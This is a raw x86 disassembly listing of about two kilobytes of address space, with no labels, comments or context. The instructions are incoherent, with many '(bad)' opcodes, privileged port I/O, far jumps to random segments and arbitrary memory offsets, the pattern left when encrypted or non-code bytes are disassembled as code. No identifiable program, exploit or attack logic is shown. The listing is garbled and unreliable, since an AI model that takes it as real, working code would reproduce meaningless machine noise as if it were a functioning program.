  4145fa:	sub    eax,0x53978d1a
  4145ff:	sar    DWORD PTR [eax],0xcc
  414602:	inc    esi
  414603:	(bad)  
  414605:	arpl   WORD PTR [ebx+edi*8+0x2559f908],ax
  41460c:	sub    esp,DWORD PTR [edi-0x8f7210d]
  414612:	xchg   edi,eax
  414613:	pop    edi
  414614:	mov    dh,0x18
  414616:	xchg   ebp,eax
  414617:	push   eax
  414618:	or     ecx,DWORD PTR [eax]
  41461a:	ins    DWORD PTR es:[edi],dx
  41461b:	cdq    
  41461c:	dec    edx
  41461d:	pop    ecx
  41461e:	ja     0x414683
  414620:	sbb    al,0xa4
  414622:	imul   eax,ecx,0xffffffdb
  414625:	jg     0x414627
  414627:	xchg   ebp,eax
  414628:	ret    
  414629:	and    eax,DWORD PTR [ecx]
  41462b:	inc    ebp
  41462c:	fistp  DWORD PTR [eax+0xc]
  41462f:	jno    0x41466d
  414631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414632:	inc    edx
  414633:	xchg   ecx,eax
  414634:	inc    esp
  414635:	mov    ds,WORD PTR [ecx+0x1b1607d2]
  41463b:	loop   0x4145c7
  41463d:	dec    ebp
  41463e:	jae    0x4145e2
  414640:	and    al,0x43
  414642:	jmp    0x414683
  414644:	ror    BYTE PTR [eax+0x26],1
  414647:	push   es
  414648:	or     DWORD PTR [edi+0x6f],edi
  41464b:	mov    ds:0xd059fdb,eax
  414650:	mov    al,BYTE PTR [edi+0x3b79f34d]
  414656:	test   DWORD PTR [esi],edi
  414658:	rcl    DWORD PTR [eax-0x656a8261],1
  41465e:	add    ch,BYTE PTR [esi]
  414660:	ss sbb al,0xd8
  414663:	fwait
  414664:	cmp    DWORD PTR [ecx-0x14],edi
  414667:	push   eax
  414668:	add    al,bl
  41466a:	pop    ss
  41466b:	cli    
  41466c:	loopne 0x41464c
  41466e:	xor    al,0x98
  414670:	xchg   BYTE PTR [edx+0x2c],cl
  414673:	jb     0x4146c4
  414675:	jmp    0x8b68b703
  41467a:	popf   
  41467b:	jecxz  0x414689
  41467d:	out    dx,eax
  41467e:	xchg   edx,eax
  41467f:	ds add dh,cl
  414682:	mov    eax,ds:0xf3086415
  414687:	mov    DWORD PTR [ecx],edx
  414689:	adc    bl,BYTE PTR [esi-0x620ea280]
  41468f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414690:	add    edx,DWORD PTR [eax]
  414692:	sbb    dl,BYTE PTR [eax-0x62fd805d]
  414698:	or     al,0x1a
  41469a:	xchg   BYTE PTR [esi+ebx*8+0x67],bl
  41469e:	in     eax,0x1d
  4146a0:	repnz xchg ebp,eax
  4146a2:	and    bl,BYTE PTR [edi]
  4146a4:	cli    
  4146a5:	mov    ?,esi
  4146a7:	vsubps xmm7,xmm5,XMMWORD PTR [esi+0x37]
  4146ac:	repnz mov ah,0x18
  4146af:	call   0x34a0b850
  4146b4:	in     eax,dx
  4146b5:	xchg   DWORD PTR [esi],esp
  4146b7:	add    ah,BYTE PTR [eax-0x6]
  4146ba:	clc    
  4146bb:	cmp    DWORD PTR [edi],0xc7cbaf8a
  4146c1:	cmc    
  4146c2:	sbb    al,BYTE PTR [eax+0x3273a8cd]
  4146c8:	mov    dl,0xdd
  4146ca:	jno    0x414667
  4146cc:	mov    WORD PTR [ecx-0x56],ds
  4146cf:	das    
  4146d0:	cmc    
  4146d1:	xchg   edi,eax
  4146d2:	sub    eax,DWORD PTR [edi]
  4146d4:	lahf   
  4146d5:	mov    edi,0x9149201f
  4146da:	inc    esi
  4146db:	fiadd  WORD PTR [ecx+0xb]
  4146de:	aaa    
  4146df:	imul   esp,ecx,0xffffff90
  4146e2:	imul   ebp,DWORD PTR [edx-0x10],0x7d4d3e15
  4146e9:	xchg   esi,eax
  4146ea:	sbb    edx,DWORD PTR [ebx+ebx*2+0x26]
  4146ee:	rol    DWORD PTR [eax+ebp*2-0x32],cl
  4146f2:	bound  esp,QWORD PTR [ebx]
  4146f4:	(bad)  
  4146f5:	and    eax,DWORD PTR [edx+0x76b79ba7]
  4146fb:	inc    esi
  4146fc:	shr    DWORD PTR [edx-0x6506407d],cl
  414702:	sub    dh,ch
  414704:	mov    esi,0x8ccb82c4
  414709:	jno    0x414714
  41470b:	in     eax,0xca
  41470d:	push   ds
  41470e:	xor    dl,BYTE PTR [ecx+0x29d0505e]
  414714:	mov    edx,0xf5fa61ee
  414719:	in     eax,0x53
  41471b:	mov    esp,0xc5abc6da
  414720:	out    dx,al
  414721:	cmp    esp,DWORD PTR [edi-0x50]
  414724:	xchg   DWORD PTR [edi-0x6d],edx
  414727:	cs dec eax
  414729:	sub    eax,0x97b70370
  41472e:	cmp    al,BYTE PTR [esi+0x637a93e6]
  414734:	push   0xffffffc7
  414736:	jbe    0x414764
  414738:	push   ebx
  414739:	imul   ecx,DWORD PTR [edi-0x62c3d17],0x73
  414740:	(bad)  
  414741:	ds inc ecx
  414743:	jg     0x4146e3
  414745:	or     BYTE PTR [edx],ch
  414747:	ins    BYTE PTR es:[edi],dx
  414748:	or     BYTE PTR [eax],bh
  41474a:	fstp   DWORD PTR [ecx+0x3c4cdf7a]
  414750:	ja     0x4146dd
  414752:	daa    
  414753:	push   edx
  414754:	pop    edi
  414755:	(bad)  ds:0x8f6f8001
  41475b:	in     eax,0x81
  41475d:	mov    ah,0xe2
  41475f:	not    bl
  414761:	xchg   ecx,eax
  414762:	mov    bl,0x2d
  414764:	mov    al,BYTE PTR [eax]
  414766:	dec    esp
  414767:	lds    esi,FWORD PTR [eax-0x29]
  41476a:	js     0x414763
  41476c:	les    eax,FWORD PTR [eax+0x51]
  41476f:	push   ebx
  414770:	cmp    DWORD PTR [esi],esi
  414772:	retf   0x1678
  414775:	mov    al,0x29
  414777:	cmp    BYTE PTR [eax+ecx*8+0x6d],ah
  41477b:	dec    edi
  41477c:	ffreep st(0)
  41477e:	jb     0x4147d5
  414780:	dec    esp
  414781:	out    dx,al
  414782:	loopne 0x414736
  414784:	pop    ebp
  414785:	xchg   ebp,eax
  414786:	rcr    DWORD PTR [esi+esi*8],0x32
  41478a:	cmp    bh,dl
  41478c:	pop    ebx
  41478d:	cli    
  41478e:	out    0xef,al
  414790:	std    
  414791:	inc    ebp
  414792:	hlt    
  414793:	adc    ebp,DWORD PTR [edx-0x1d]
  414796:	lahf   
  414797:	inc    esi
  414798:	mov    ds:0x9369fee8,al
  41479d:	rol    BYTE PTR [esi+0x7da29d04],1
  4147a3:	arpl   bx,sp
  4147a5:	inc    eax
  4147a6:	push   edi
  4147a7:	(bad)
  4147aa:	pand   mm4,QWORD PTR [esi-0x57c76dd4]
  4147b1:	jmp    0x5a65cab7
  4147b6:	or     al,0xfa
  4147b8:	cld    
  4147b9:	lods   eax,DWORD PTR ds:[esi]
  4147ba:	pop    es
  4147bb:	mov    eax,0x1d45a396
  4147c0:	inc    esp
  4147c1:	xor    al,0xed
  4147c3:	pop    ds
  4147c4:	jo     0x4147c9
  4147c6:	in     al,0x24
  4147c8:	in     eax,dx
  4147c9:	jg     0x414801
  4147cb:	test   al,0x72
  4147cd:	repnz test DWORD PTR [eax],ecx
  4147d0:	sahf   
  4147d1:	dec    eax
  4147d2:	jo     0x4147d1
  4147d4:	pusha  
  4147d5:	clc    
  4147d6:	int    0xf4
  4147d8:	pop    ebp
  4147d9:	xlat   BYTE PTR ds:[ebx]
  4147da:	sbb    BYTE PTR [ebp+0x423080d6],dl
  4147e0:	mov    ebx,0x9af2a8e6
  4147e5:	sbb    eax,0x90ae9252
  4147ea:	(bad)  [eax+ecx*4]
  4147ed:	(bad)  
  4147ee:	and    ah,dh
  4147f0:	stos   BYTE PTR es:[edi],al
  4147f1:	push   ecx
  4147f2:	cld    
  4147f3:	(bad)  
  4147f4:	jg     0x41485f
  4147f6:	xor    DWORD PTR [esi+0x2c],esi
  4147f9:	xchg   DWORD PTR [eax-0x2],esp
  4147fc:	dec    ebx
  4147fd:	ret    0xa12a
  414800:	sti    
  414801:	adc    DWORD PTR [edi-0x46bea78a],ebp
  414807:	jmp    0x414863
  414809:	jle    0x414886
  41480b:	mov    al,0x7c
  41480d:	jbe    0x414809
  41480f:	jge    0x414883
  414811:	lock push 0x5d27c37c
  414817:	xor    al,0x4e
  414819:	pushf  
  41481a:	mov    edi,DWORD PTR [edx+0x6b]
  41481d:	xchg   ecx,eax
  41481e:	gs mov al,0x90
  414821:	mov    dl,0xc6
  414823:	jae    0x4147da
  414825:	push   ecx
  414826:	retf   
  414827:	imul   eax,DWORD PTR [ecx-0x3ae98077],0xffffffbe
  41482e:	retf   
  41482f:	mov    edi,0xd9d14b99
  414834:	push   ebp
  414835:	scas   eax,DWORD PTR es:[edi]
  414836:	pop    ds
  414837:	pop    ebx
  414838:	loope  0x414876
  41483a:	stos   DWORD PTR es:[edi],eax
  41483b:	into   
  41483c:	mov    edi,0xd4baa0af
  414841:	and    edx,DWORD PTR [edx+0x476dee17]
  414847:	js     0x41486e
  414849:	add    al,0xd7
  41484b:	das    
  41484c:	xchg   BYTE PTR [edi],bh
  41484e:	mov    edi,0xa82657c9
  414853:	cmp    al,0xf9
  414855:	stos   BYTE PTR es:[edi],al
  414856:	(bad)  
  414857:	sar    DWORD PTR [esi+0x21],cl
  41485a:	xchg   ebx,eax
  41485b:	push   cs
  41485c:	sbb    eax,0xaa60aea
  414861:	or     eax,0x1bd8426a
  414866:	mov    bl,ah
  414868:	inc    ebp
  414869:	or     al,0x0
  41486b:	lahf   
  41486c:	setl   BYTE PTR [eax-0x5b]
  414870:	cli    
  414871:	sub    eax,0x83717ab8
  414876:	imul   edi,esp,0xe5e55f9c
  41487c:	push   DWORD PTR [edi+ebp*2+0x6d]
  414880:	inc    esi
  414881:	aad    0x71
  414883:	loop   0x4148fa
  414885:	inc    esp
  414886:	test   DWORD PTR [ebp-0x4b],edx
  414889:	iret   
  41488a:	stc    
  41488b:	add    ebp,ecx
  41488d:	jp     0x4148ea
  41488f:	ss dec esi
  414891:	lods   eax,DWORD PTR ds:[esi]
  414892:	ficom  DWORD PTR [edx+0x42]
  414895:	inc    esp
  414896:	ins    DWORD PTR es:[edi],dx
  414897:	repnz bound ebp,QWORD PTR [edi+0x2f]
  41489b:	mov    ebp,?
  41489d:	fcomi  st,st(4)
  41489f:	cli    
  4148a0:	push   cs
  4148a1:	lahf   
  4148a2:	jae    0x414830
  4148a4:	aas    
  4148a5:	fisttp QWORD PTR [ebx]
  4148a7:	sub    ebp,edx
  4148a9:	retf   0x8f2
  4148ac:	add    al,0x4d
  4148ae:	sub    edi,DWORD PTR [eax+0x31]
  4148b1:	jno    0x414882
  4148b3:	and    ebx,DWORD PTR [esi]
  4148b5:	in     eax,dx
  4148b6:	enter  0xd1fc,0x80
  4148ba:	jne    0x4148c9
  4148bc:	push   esp
  4148bd:	pop    ds
  4148be:	and    eax,0x243ca677
  4148c3:	sub    ebx,DWORD PTR [eax-0x460c7d95]
  4148c9:	jns    0x414901
  4148cb:	dec    esp
  4148cc:	pop    ecx
  4148cd:	(bad)  
  4148ce:	popa   
  4148cf:	hlt    
  4148d0:	sbb    DWORD PTR [eax-0x28724d8e],esi
  4148d6:	cmp    DWORD PTR [edi+eax*8+0x627006d9],ecx
  4148dd:	fwait
  4148de:	(bad)  
  4148df:	cwde   
  4148e0:	mov    WORD PTR [esi],ds
  4148e2:	and    al,0xfc
  4148e4:	cmc    
  4148e5:	(bad)  
  4148e6:	in     eax,dx
  4148e7:	add    ch,0x63
  4148ea:	sub    DWORD PTR [ecx-0x4d6a20b6],esi
  4148f0:	mov    esi,0x16ec517d
  4148f5:	lds    eax,FWORD PTR [edi-0x46]
  4148f8:	test   DWORD PTR [edx-0x7],esp
  4148fb:	fs cld 
  4148fd:	mov    ecx,0x44b24d22
  414902:	es add ebx,0xffffff85
  414906:	(bad)
  41490b:	sub    dh,ah
  41490d:	je     0x4148d7
  41490f:	js     0x4148d6
  414911:	adc    ch,cl
  414913:	sub    ch,BYTE PTR [ebx+0xf0bf28c]
  414919:	sahf   
  41491a:	and    cl,bh
  41491c:	(bad)
  41491f:	test   eax,0xfa5517b3
  414924:	and    DWORD PTR [esi+ebx*4-0x15103670],ecx
  41492b:	pop    esi
  41492c:	(bad)  [eax+0x3c75cc47]
  414932:	push   edi
  414933:	retf   0x9197
  414936:	imul   esp,esi,0x6b
  414939:	push   edx
  41493a:	fs sub eax,0xfcf17b09
  414940:	jne    0x414955
  414942:	inc    esp
  414943:	pop    eax
  414944:	pusha  
  414945:	call   FWORD PTR [edx]
  414947:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414948:	sub    eax,0x72d5fe45
  41494d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41494e:	lahf   
  41494f:	mov    ecx,esi
  414951:	shr    DWORD PTR [eax-0x22],1
  414954:	mov    esi,DWORD PTR [eax+0x1052f3b5]
  41495a:	xor    al,0xfa
  41495c:	data16 cmp dh,BYTE PTR [ebp-0x34]
  414960:	into   
  414961:	fidivr WORD PTR [ebp+0x4f]
  414964:	gs sahf 
  414966:	pop    edi
  414967:	cdq    
  414968:	aam    0x5
  41496a:	mul    DWORD PTR [ebx+0x2e]
  41496d:	pop    edx
  41496e:	pop    esi
  41496f:	inc    ecx
  414970:	jnp    0x4149de
  414972:	jns    0x41490a
  414974:	sbb    cl,BYTE PTR [ebp-0x1eac72a4]
  41497a:	scas   al,BYTE PTR es:[edi]
  41497b:	cmp    BYTE PTR [edi],0x5
  41497e:	sbb    al,0x1a
  414980:	sbb    cl,BYTE PTR [ecx-0x4c5c892d]
  414986:	nop
  414987:	jne    0x4149ec
  414989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41498a:	pop    edi
  41498b:	xor    cl,BYTE PTR [edi]
  41498d:	adc    dl,ch
  41498f:	sub    DWORD PTR [esi-0x684bc213],edi
  414995:	stos   BYTE PTR es:[edi],al
  414996:	into   
  414997:	mov    ecx,0x6e80ce5d
  41499c:	cmp    al,0x8e
  41499e:	fldenv [ecx-0x7950f1e5]
  4149a4:	pushaw 
  4149a6:	(bad)  
  4149a9:	sbb    BYTE PTR [edx],cl
  4149ab:	into   
  4149ac:	and    edx,edx
  4149ae:	fwait
  4149af:	dec    esp
  4149b0:	iret   
  4149b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149b2:	xchg   ecx,eax
  4149b3:	push   es
  4149b4:	jge    0x414955
  4149b6:	jmp    0x41493c
  4149b8:	xchg   ebx,eax
  4149b9:	push   esp
  4149ba:	outs   dx,DWORD PTR ds:[esi]
  4149bb:	in     al,0x78
  4149bd:	ret    
  4149be:	in     al,0xda
  4149c0:	fadd   DWORD PTR [edi]
  4149c2:	fucom  st(3)
  4149c4:	scas   al,BYTE PTR es:[edi]
  4149c5:	nop
  4149c6:	outs   dx,DWORD PTR ds:[esi]
  4149c7:	scas   al,BYTE PTR es:[edi]
  4149c8:	aas    
  4149c9:	fsub   st(0),st
  4149cb:	dec    ecx
  4149cc:	pop    es
  4149cd:	cld    
  4149ce:	jge    0x414a00
  4149d0:	hlt    
  4149d1:	ror    DWORD PTR [ebp-0x1440214c],cl
  4149d7:	clc    
  4149d8:	push   ebx
  4149d9:	ret    
  4149da:	gs pop es
  4149dc:	adc    eax,0xbe288645
  4149e1:	rcr    BYTE PTR [edi],1
  4149e3:	addr16 mov al,0x9f
  4149e6:	in     al,0x29
  4149e8:	sub    eax,0x4516ce51
  4149ed:	rcl    DWORD PTR [ecx+edi*4],0x25
  4149f1:	push   0x41
  4149f3:	shl    DWORD PTR [eax],0x3d
  4149f6:	push   ecx
  4149f7:	mov    dh,0x2b
  4149f9:	mov    al,ds:0x655e3b99
  4149fe:	int    0x28
  414a00:	push   ebp
  414a01:	push   ss
  414a02:	lahf   
  414a03:	dec    al
  414a05:	cwde   
  414a06:	arpl   WORD PTR [eax+0x4a68a318],si
  414a0c:	and    ah,bh
  414a0e:	test   bh,0x41
  414a11:	jp     0x41499c
  414a13:	rcl    edi,cl
  414a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a16:	mov    WORD PTR [edi+0x10],ds
  414a19:	inc    eax
  414a1a:	and    DWORD PTR ds:0x83a1c592,ebx
  414a20:	cmp    edx,0xffffffdd
  414a23:	mov    ds:0xaa5b9dcf,al
  414a28:	lods   al,BYTE PTR ds:[esi]
  414a29:	call   0x89f1:0xc4ac63c
  414a30:	mov    esi,0xdb778cbd
  414a35:	loope  0x4149bc
  414a37:	out    0x30,eax
  414a39:	push   ecx
  414a3a:	xlat   BYTE PTR ds:[ebx]
  414a3b:	lods   eax,DWORD PTR ds:[esi]
  414a3c:	test   edi,esi
  414a3e:	mov    ch,0x20
  414a40:	stos   BYTE PTR es:[edi],al
  414a41:	pusha  
  414a42:	jmp    0xed80ee7e
  414a47:	hlt    
  414a48:	retf   0x2309
  414a4b:	mov    ah,0x2
  414a4d:	mov    al,BYTE PTR [esi]
  414a4f:	push   esi
  414a50:	gs leave 
  414a52:	mov    ?,WORD PTR [edi-0xb2b2aaa]
  414a58:	mov    dl,0x23
  414a5a:	mov    ah,0xef
  414a5c:	sar    dl,1
  414a5e:	xor    dl,BYTE PTR [ebp-0x75b88d0]
  414a64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a65:	test   DWORD PTR [edx],ebx
  414a67:	mov    ds:0xa28f6234,eax
  414a6c:	xlat   BYTE PTR ds:[ebx]
  414a6d:	out    0x98,al
  414a6f:	out    dx,al
  414a70:	lea    edi,[ebx]
  414a72:	jle    0x414a2d
  414a74:	nop
  414a75:	ja     0x414a09
  414a77:	fisubr DWORD PTR [ecx+0x6a]
  414a7a:	mov    DWORD PTR [eax+0x43a25102],esi
  414a80:	inc    ebx
  414a81:	jg     0x414a77
  414a83:	push   ss
  414a84:	in     eax,dx
  414a85:	lock inc edi
  414a87:	mov    bl,0x38
  414a89:	scas   al,BYTE PTR es:[edi]
  414a8a:	ja     0x414a8a
  414a8c:	cdq    
  414a8d:	cmp    DWORD PTR [edx],ecx
  414a8f:	mov    cl,0xe9
  414a91:	sbb    eax,0x3577bcd8
  414a96:	and    DWORD PTR ds:0x1328510c,esp
  414a9c:	mov    edi,0xdea3127d
  414aa1:	inc    ebx
  414aa2:	mov    cl,0x91
  414aa4:	mov    al,ds:0xcc71faa1
  414aa9:	aas    
  414aaa:	sub    BYTE PTR [ebx],bh
  414aac:	(bad)  
  414aad:	jmp    FWORD PTR [esi+ecx*1-0xb0cb05f]
  414ab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ab5:	loopne 0x414a63
  414ab7:	jle    0x414a53
  414ab9:	cmp    BYTE PTR [ebx],ch
  414abb:	jnp    0x414b18
  414abd:	cwde   
  414abe:	int3   
  414abf:	push   ecx
  414ac0:	es mov eax,0xc80d6624
  414ac6:	push   esi
  414ac7:	mov    ebx,0xdb0c6911
  414acc:	adc    BYTE PTR [esp+ecx*2],al
  414acf:	pop    edi
  414ad0:	mov    DWORD PTR [edi+0x79cb2e03],eax
  414ad6:	pop    edx
  414ad7:	add    eax,0x1ff4b52f
  414adc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414add:	nop
  414ade:	outs   dx,BYTE PTR ds:[esi]
  414adf:	mov    ah,0x2d
  414ae1:	nop
  414ae2:	icebp  
  414ae3:	inc    edi
  414ae4:	mov    ds:0x8f65b061,eax
  414ae9:	adc    bh,0x15
  414aec:	sbb    bh,BYTE PTR [edi+eax*1+0x33]
  414af0:	inc    edx
  414af1:	addr16 sar al,0xd4
  414af5:	(bad)  
  414af6:	ins    BYTE PTR es:[edi],dx
  414af7:	loopne 0x414a9d
  414af9:	and    DWORD PTR [ebx-0x35],0xffffffa2
  414afd:	lahf   
  414afe:	ficomp WORD PTR [ebx-0x4bfea85e]
  414b04:	mov    eax,0xc126526e
  414b09:	daa    
  414b0a:	xchg   esi,eax
  414b0b:	and    dl,BYTE PTR [edx+0x1a]
  414b0e:	jmp    0xb2575da2
  414b13:	adc    edx,DWORD PTR [esi+0x35]
  414b16:	pop    es
  414b17:	xor    cl,bh
  414b19:	ret    0xd768
  414b1c:	mov    esi,DWORD PTR [edi+0x1d]
  414b1f:	push   ds
  414b20:	jecxz  0x414b69
  414b22:	jmp    0x94ffb4df
  414b27:	adc    ah,BYTE PTR [edi]
  414b29:	xchg   esp,eax
  414b2a:	repz imul edi,DWORD PTR [eax-0x3f],0x5b
  414b2f:	(bad)  
  414b30:	pop    ss
  414b31:	mov    esi,0x52dfeacf
  414b36:	dec    ebx
  414b37:	idiv   ebx
  414b39:	mov    ah,0x39
  414b3b:	stc    
  414b3c:	mov    WORD PTR [ebx-0x21756058],gs
  414b42:	imul   ebp,DWORD PTR [edi+0x127060aa],0x5c8b8331
  414b4c:	(bad)  
  414b4d:	xchg   esi,eax
  414b4e:	mov    dl,0xf8
  414b50:	dec    edx
  414b51:	xchg   BYTE PTR [esi+ebp*2],cl
  414b54:	sahf   
  414b55:	mov    bh,0x3f
  414b57:	sub    edi,DWORD PTR [edx-0x36]
  414b5a:	pop    eax
  414b5b:	icebp  
  414b5c:	adc    al,0x1b
  414b5e:	pop    ss
  414b5f:	jne    0x414b44
  414b61:	hlt    
  414b62:	sahf   
  414b63:	enter  0x75bd,0xb8
  414b67:	ins    BYTE PTR es:[edi],dx
  414b68:	mov    edx,0x354b17fe
  414b6d:	es scas al,BYTE PTR es:[edi]
  414b6f:	call   0x9f26:0xeb8f3843
  414b76:	aad    0xbe
  414b78:	lea    ecx,[eax+0x0]
  414b7b:	mov    edx,DWORD PTR [edx-0x5b27a53f]
  414b81:	and    eax,0xc2d30873
  414b86:	dec    edx
  414b87:	imul   edx,edx,0x70
  414b8a:	inc    ebx
  414b8b:	push   esi
  414b8c:	adc    BYTE PTR [edx+edx*1+0xc],bh
  414b90:	in     eax,dx
  414b91:	jb     0x414b3d
  414b93:	or     ebx,edx
  414b95:	mov    ah,0xc0
  414b97:	iret   
  414b98:	(bad)  
  414b99:	in     al,0x56
  414b9b:	mov    bl,0xd2
  414b9d:	push   eax
  414b9e:	jg     0x414bf2
  414ba0:	mov    dl,0xed
  414ba2:	es scas al,BYTE PTR es:[edi]
  414ba4:	mov    ah,0x53
  414ba6:	pop    es
  414ba7:	rcr    BYTE PTR [edx],0xe2
  414baa:	imul   ebp,DWORD PTR [ebx-0x1ca97672],0xfffffffa
  414bb1:	cmp    DWORD PTR [edi-0x56],ecx
  414bb4:	pop    ecx
  414bb5:	and    edx,DWORD PTR [ebp-0x43738e87]
  414bbb:	push   esi
  414bbc:	shr    BYTE PTR [ecx+0x1e1acaf1],cl
  414bc2:	fdiv   QWORD PTR [edx+0x23]
  414bc5:	sub    ecx,DWORD PTR [edi-0x310c63d1]
  414bcb:	mov    ds:0x6479db77,al
  414bd0:	into   
  414bd1:	and    eax,0xfb20e8e2
  414bd6:	into   
  414bd7:	shl    cl,0xdb
  414bda:	cmp    eax,0x7d1c44b8
  414bdf:	xchg   ebp,eax
  414be0:	xor    al,0x4b
  414be2:	pop    edi
  414be3:	in     al,dx
  414be4:	adc    eax,0xa3001d41
  414be9:	inc    eax
  414bea:	sub    eax,0x304b9e70
  414bef:	dec    ebx
  414bf0:	fsubr  QWORD PTR [edx]
  414bf2:	scas   eax,DWORD PTR es:[edi]
  414bf3:	pop    ebp
  414bf4:	sbb    BYTE PTR [ecx+0x24],dl
  414bf7:	mov    WORD PTR [bx-0x19f4],es
  414bfc:	xor    DWORD PTR [esi-0x55],edx
  414bff:	and    ch,BYTE PTR [esi-0xe]
  414c02:	or     eax,DWORD PTR [esi+0x7082ca22]
  414c08:	stos   DWORD PTR es:[edi],eax
  414c09:	aam    0x1c
  414c0b:	popa   
  414c0c:	push   ecx
  414c0d:	xchg   DWORD PTR cs:[esi-0x34],ecx
  414c11:	mov    cl,0x2
  414c13:	push   0x5051918d
  414c18:	mov    ecx,0xf82de2c0
  414c1d:	inc    ecx
  414c1e:	xor    BYTE PTR [ebx+0x80521d7],0xda
  414c25:	inc    edi
  414c26:	pop    ebp
  414c27:	nop
  414c28:	push   ds
  414c29:	shl    edi,1
  414c2b:	outs   dx,BYTE PTR ds:[esi]
  414c2c:	mov    eax,ds:0xb27c8e97
  414c31:	mov    ds:0xdadd017a,al
  414c36:	adc    eax,0xfb2b0c45
  414c3b:	cmp    BYTE PTR [ecx],bl
  414c3d:	xor    dl,BYTE PTR [ecx]
  414c3f:	cmp    DWORD PTR [eax+ebp*1-0x38],edx
  414c43:	pop    edi
  414c44:	mov    BYTE PTR [ebx-0x77],dl
  414c47:	add    esp,DWORD PTR ds:0xd9d18547
  414c4d:	pop    esi
  414c4e:	imul   ebp,DWORD PTR [eax],0x32
  414c51:	ret    
  414c52:	pop    es
  414c53:	or     ecx,DWORD PTR [ecx-0x565a5983]
  414c59:	push   esi
  414c5a:	(bad)  
  414c5b:	cli    
  414c5c:	hlt    
  414c5d:	sti    
  414c5e:	test   al,0x60
  414c60:	inc    ebp
  414c61:	shl    DWORD PTR [esi-0x5620b11f],1
  414c67:	int3   
  414c68:	xchg   ebx,eax
  414c69:	cld    
  414c6a:	push   eax
  414c6b:	mov    ?,WORD PTR [ebp-0x9]
  414c6e:	pop    eax
  414c6f:	stos   BYTE PTR es:[edi],al
  414c70:	ins    DWORD PTR es:[edi],dx
  414c71:	xor    BYTE PTR [ecx],ah
  414c73:	cdq    
  414c74:	mov    cl,0x31
  414c76:	xchg   ebx,eax
  414c77:	dec    edx
  414c78:	push   ebp
  414c79:	bound  esi,QWORD PTR [ecx-0x40c04e7e]
  414c7f:	rcl    DWORD PTR [ebp+0x77],1
  414c82:	mov    bl,0xf4
  414c84:	jmp    0x99e4:0xda3495b7
  414c8b:	jecxz  0x414c55
  414c8d:	in     al,dx
  414c8e:	aaa    
  414c8f:	arpl   WORD PTR [esp+eiz*8-0x77],dx
  414c93:	out    0xfe,eax
  414c95:	mov    ebp,0x55debab4
  414c9a:	outs   dx,BYTE PTR ds:[esi]
  414c9b:	cli    
  414c9c:	mov    esp,0xc752ddd
  414ca1:	aas    
  414ca2:	mov    al,0x59
  414ca4:	inc    edx
  414ca5:	or     cl,dl
  414ca7:	xor    DWORD PTR [eax+0x79],ecx
  414caa:	push   eax
  414cab:	mov    ebx,0x146c181a
  414cb0:	mov    eax,ds:0x25bf7266
  414cb5:	push   ecx
  414cb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cb7:	out    0xb5,al
  414cb9:	pop    ebp
  414cba:	push   edx
  414cbb:	outs   dx,BYTE PTR fs:[esi]
  414cbd:	stos   DWORD PTR es:[edi],eax
  414cbe:	dec    edx
  414cbf:	(bad)  
  414cc0:	jne    0x414d0f
  414cc2:	mov    ah,0x49
  414cc4:	inc    ebx
  414cc5:	sti    
  414cc6:	(bad)  
  414cc8:	out    dx,al
  414cc9:	cwde   
  414cca:	jne    0x414c51
  414ccc:	mov    edx,es
  414cce:	push   0x268da9bf
  414cd3:	dec    ebx
  414cd4:	sub    al,0x63
  414cd6:	not    DWORD PTR ds:0xcc16a082
  414cdc:	inc    edx
  414cdd:	sbb    BYTE PTR [ecx],0x64
  414ce0:	daa    
  414ce1:	out    dx,eax
  414ce2:	enter  0xb2e7,0x71
  414ce6:	jb     0x414cbc
  414ce8:	cmp    ch,BYTE PTR [ebx+0x1827aa86]
  414cee:	das    
  414cef:	in     al,dx
  414cf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cf1:	ret    0xccea
  414cf4:	sub    eax,0xb68491c3
  414cf9:	call   0xbae2:0x87a96ecc
  414d00:	xchg   DWORD PTR [ecx+esi*2],edx
  414d03:	aaa    
  414d04:	mov    ds:0x28253b58,al
  414d09:	and    edi,DWORD PTR [edx+0x10]
  414d0c:	push   esi
  414d0d:	and    al,0x5e
  414d0f:	cmp    BYTE PTR [ecx+0x27cb6217],bl
  414d15:	fld    TBYTE PTR [ebx+0x6fb53410]
  414d1b:	and    esi,DWORD PTR ds:0xbc270c9
  414d21:	xchg   esi,eax
  414d22:	cmp    dl,BYTE PTR [ebx+esi*8+0x5f]
  414d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d28:	mov    al,0xe
  414d2a:	mov    cl,BYTE PTR [esi+0x75141cbd]
  414d30:	push   ebp
  414d31:	leave  
  414d32:	cli    
  414d33:	imul   ebp,edx,0x26
  414d36:	or     ch,BYTE PTR [eax+0x615dc0ee]
  414d3c:	dec    edi
  414d3d:	test   ah,dl
  414d3f:	mov    eax,0x95639ee4
  414d44:	mov    ch,0xb
  414d46:	adc    ebx,DWORD PTR [edi]
  414d48:	mov    al,ds:0x2272cb7a
  414d4d:	div    dl
  414d4f:	pop    edx
  414d50:	adc    BYTE PTR [esi-0x2c1d4bd7],dh
  414d56:	cwde   
  414d57:	test   DWORD PTR [eax-0x7f5e04b1],0x6d4ed2d9
  414d61:	lea    eax,ds:0xc227150a
  414d67:	(bad)  
  414d68:	or     al,0x8c
  414d6a:	xor    al,0x1a
  414d6c:	loope  0x414de0
  414d6e:	mov    dl,0x42
  414d70:	adc    BYTE PTR [eax+edx*8+0x1b3d7684],ch
  414d77:	out    dx,al
  414d78:	mov    ds:0x2bfe0336,eax
  414d7d:	mov    dl,0xea
  414d7f:	push   ebx
  414d80:	jmp    0x81877279
  414d85:	stos   DWORD PTR es:[edi],eax
  414d86:	out    0x3a,eax
  414d88:	push   ss
  414d89:	add    eax,0xa1e7bc4b
  414d8e:	sbb    BYTE PTR [edi],dh
  414d90:	pop    es
  414d91:	adc    BYTE PTR [edi+0x7702bd91],bh
  414d97:	adc    ebx,DWORD PTR [eax-0x3b]
